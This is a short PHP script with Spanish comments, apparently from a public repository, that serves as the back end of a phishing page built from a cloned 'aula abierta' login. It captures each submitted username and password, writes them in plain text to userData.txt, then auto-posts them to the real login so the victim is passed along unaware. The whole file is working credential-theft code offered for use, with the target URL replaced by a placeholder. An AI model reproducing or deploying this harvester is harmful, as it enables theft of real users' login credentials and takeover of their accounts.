// No se sube la página clonada con httrack, pero el código del login debe ser modificado para llamar a este código en el formulario correspondiente.
// En LINK se debe colocar la URL del .php del login del aula abierta. Esta es la URL a la que se le enviarán los datos y a la que se redirigirá al usuario. Se quitó la URL correspondiente para su carga en GitHub.
<?php
//Se guardan en password y username los valores ingresados en el formulario por el usuario. Enviados por el método POST.
$password = $_POST['password'];
$username = $_POST['username'];

//Se abre el archivo userData.txt en modo de escritura
$file = fopen("userData.txt", "a");

//Se escribe en el archivo el usuario y contraseña con el formato username - password
fwrite($file, $username . ' - ' . $password . PHP_EOL);

//Se cierra el archivo
fclose($file);

//Se crea un formulario para enviar los datos a la página real 
echo '<form id="redirectToRealPage" method="post" action="LINK">';

//Se crean dos inputs ocultos para enviar el usuario y contraseña a la página real
echo '<input type="hidden" name="username" value="' . htmlspecialchars($username) . '">';
echo '<input type="hidden" name="password" value="' . htmlspecialchars($password) . '">';
echo '</form>';
echo '<script type="text/javascript">';
//Se envían el formulario automáticamente.
echo 'document.getElementById("redirectToRealPage").submit();';
echo '</script>';
?>